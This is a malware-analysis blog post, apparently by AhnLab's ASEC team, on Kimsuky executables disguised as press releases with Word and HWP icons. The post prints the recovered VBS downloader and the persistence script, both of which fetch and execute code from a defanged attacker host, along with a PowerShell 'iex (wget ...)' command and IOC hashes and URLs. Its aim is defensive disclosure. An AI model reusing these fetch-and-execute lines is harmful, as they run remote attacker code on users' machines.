<div>
Posted on <a href="https://asec.ahnlab.com/en/34694/" rel="bookmark" title="10:02 am">May 25, 2022</a>
<h1 class="title">Kimsuky’s Attack Attempts Disguised as Press Releases of Various Topics</h1>
<p>The ASEC analysis team has discovered that a malware strain disguised as press releases is being distributed. When this malware is run, it loads a normal document file and attempts to access malicious URLs. If the access is successful, the script existing on the webpage is run. It appears the script is of a similar type to the VBS code found in the ASEC blog post &lt;<a href="https://asec.ahnlab.com/en/31879/">APT Attack Attempts Disguised as North Korea Related Paper Requirements (Kimsuky)</a>&gt;.</p>
<p>The list of files discovered so far is as follows:</p>
<ul><li>North Korea’s Admission of Covid-19 Outbreak and Future Prospects of the Korean Peninsula .docx.exe</li><li>1. Press Release (For teenagers in the province: operating hands-on drone education).hwp .exe</li><li>2. Press Release (17th Adoption Day Celebration held after 3 years).hwp .exe</li><li>3. Press Release (** Institute of Design Promotion pushes for a support project to relieve design issues for small companies).hwp .exe</li><li>4. Press Release (** Province hosts a social network event for the Family Month).hwp .exe</li></ul>
<p>The files are configured as .NET, but they show HWP or Word icons to appear as document files.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34391 jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%ED%8C%8C%EC%9D%BC-2.png?resize=670%2C237&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34391" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%ED%8C%8C%EC%9D%BC-2.png?resize=670%2C237&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 1. Executables</figcaption></figure>
<p></p>
<ul><li>North Korea’s Admission of Covid-19 Outbreak and Future Prospects of the Korean Peninsular .docx.exe</li></ul>
<p>When the file is run, it creates a script file named Roamingtemp in the AppData folder and executes it with the command “wscript.exe /e:vbscript /b [Roamingtemp path]\Roamingtemp”.</p>
<code class="language-js">On Error Resume Next:
Set mx = CreateObject("Microsoft.XMLHTTP"):
mx.open "GET", "hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload/list.php?query=1", False:
mx.Send:
Execute(mx.responseText)</code>
<p></p>
<p>After the file is run, the malware accesses hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/attach/attach.docx to download a normal Word file. The file is saved with the filename of the executable. Below is the file currently confirmed.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34397 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%B6%84%EC%84%9D%EC%9E%90%EB%A3%8C_%ED%98%84%EC%9E%AC.png?resize=877%2C517&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34397" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%B6%84%EC%84%9D%EC%9E%90%EB%A3%8C_%ED%98%84%EC%9E%AC.png?resize=877%2C517&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 2. Created Word file</figcaption></figure>
<p></p>
<p>Upon checking the URL, the team discovered that a Word file with the same name as the executable had been downloaded. As such, it is likely that the following Word file would have been downloaded when the executable was distributed.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34398 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%B6%84%EC%84%9D%EC%9E%90%EB%A3%8C.png?resize=1024%2C647&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34398" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%B6%84%EC%84%9D%EC%9E%90%EB%A3%8C.png?resize=1024%2C647&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 3. Word file thought to be downloaded at the moment of distribution</figcaption></figure>
<p></p>
<p>The malware then checks if a file named e653d73e45833b6c exists in the %Temp% folder to create a message box. If the file does not exist, it creates the file named e653d73e45833b6c and saves the encoded value of the current time to create a message box. If the file exists, the time saved in the file is compared with the current time. The message box is created only when the difference is bigger than 0x7F days. It seems the message box is created to make the user think the file is a normal one.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34401 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%A9%94%EC%8B%9C%EC%A7%80%EB%B0%95%EC%8A%A4.png?resize=484%2C264&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34401" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%A9%94%EC%8B%9C%EC%A7%80%EB%B0%95%EC%8A%A4.png?resize=484%2C264&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 4. Created message box</figcaption></figure>
<p></p>
<p>As for malware disguised as HWP files, it downloads HWP files instead of Word files. The files need to have a blank space of certain bytes between .hwp and .exe in the filename to be normally created. The Roamingtemp that is created is the same as the file mentioned earlier.</p>
<figure class="wp-block-table"><table><thead><tr><td>Filename</td><td>Download URLs for Files</td></tr></thead><tbody><tr><td>1. Press Release (For teenagers in the province: operating hands-on drone education).hwp .exe</td><td>hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/attach/attach1.hwp</td></tr><tr><td>2. Press Release (17th Adoption Day Celebration held after 3 years).hwp .exe</td><td>hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/attach/attach2.hwp</td></tr><tr><td>3. Press Release (** Institute of Design Promotion pushes for a support project to relieve design issues for small companies).hwp .exe</td><td>hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/attach/attach3.hwp</td></tr><tr><td>4. Press Release (** Province hosts a social network event for the Family Month).hwp .exe</td><td>hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/attach/attach4.hwp</td></tr></tbody></table><figcaption>Table 1. Download URLs for files</figcaption></figure>
<p>The document files created through executables are all normal files, likely to prevent users from noticing malicious behaviors. The file created from ‘3. Press Release (** Institute of Design Promotion pushes for a support project to relieve design issues for small companies)’ is shown below.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34452 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%B3%B4%ED%86%A0%EC%9E%90%EB%A3%8C3_2-1.png?resize=1024%2C773&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34452" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%B3%B4%ED%86%A0%EC%9E%90%EB%A3%8C3_2-1.png?resize=1024%2C773&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 5. File created from ‘3. Press Release (** Institute of Design Promotion pushes for a support project to relieve design issues for small companies)’</figcaption></figure>
<p></p>
<p>As the content of the file does not match the name of the distributed file, it is likely that the attacker is distributing malware with various filenames.</p>
<p>At the time of the analysis, the URL found in Roamingtemp (hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload/list.php?query=1) had a script code that is similar to the VBS code confirmed in the post &lt;<a href="https://asec.ahnlab.com/en/31879/">APT Attack Attempts Disguised as North Korea Related Paper Requirements (Kimsuky)</a>&gt;.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34408 jetpack-lazy-image" height="738" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/query1.png?resize=1024%2C674&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1122"/><img alt="" class="wp-image-34408" height="738" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/query1.png?resize=1024%2C674&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1122"/><figcaption>Figure 6. Webpage accessed by Roamingtemp</figcaption></figure>
<p></p>
<p>When the script is run, it creates a file named OfficeAppManifest_v[minute]_[hour]_[day and month].xml in the %AppData%\Microsoft\Windows\Templates folder and registers the service that runs xml files as if it was registered by Microsoft.</p>
<figure class="wp-block-table"><table><tbody><tr><td>On Error Resume Next:With CreateObject(“InternetExplorer.Application”):.Navigate “hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload/list.php?query=6”:Do while .busy:WScript.Sleep 100:Loop:bt=.Document.Body.InnerText:.Quit:End With:Execute(bt)</td></tr></tbody></table><figcaption>OfficeAppManifest_v[minute]_[hour]_[day and month].xml</figcaption></figure>
<p></p>
<p>The script then changes browser-related settings and runs the powershell command shown below. As the team could not access the URL included in the command, it could not figure out what behaviors are performed after powershell is executed.</p>
<figure class="wp-block-table"><table><tbody><tr><td>cmd /c powershell -command “iex (wget hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload/lib.php?idx=1).content; GetInfo -ur ‘hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload’;</td></tr></tbody></table><figcaption>Powershell command</figcaption></figure>
<p></p>
<p>As malware disguised as North-Korea related materials as well as press releases are distributed recently, users need to take caution. You should check the extension of the file before opening it and refrain from running files of unknown sources.</p>
<p>AhnLab’s anti-malware software, V3, is currently detecting and blocking the files using the following aliases.</p>
<p>[File Detection]
Downloader/VBS.Generic
Trojan/Win.MSILKrypt.R492841</p>
<p>[IOC]
d6730f10a839d128e94b5aa05d9fb1ec
5573953bf4dafa96877dacf3435db228
3ad7a29a1f661034da0b3779a4046849
a15c386db0a3d0d208042d0982f21f37
34b7356722b992992f5382b0761466bc
94fdc2115ce7f4ab0234a1e26901cb1c
hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/attach/
hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload/list.php?query=1
hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload/list.php?query=6
hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload/lib.php?idx=1
hxxp://mc.pzs[.]kr/themes/mobile/images/about/temp/upload</p>
<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
<p>
Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
<p>Tagged as:<a href="https://asec.ahnlab.com/en/tag/kimsuky-en/" rel="tag">Kimsuky</a></p>
</div>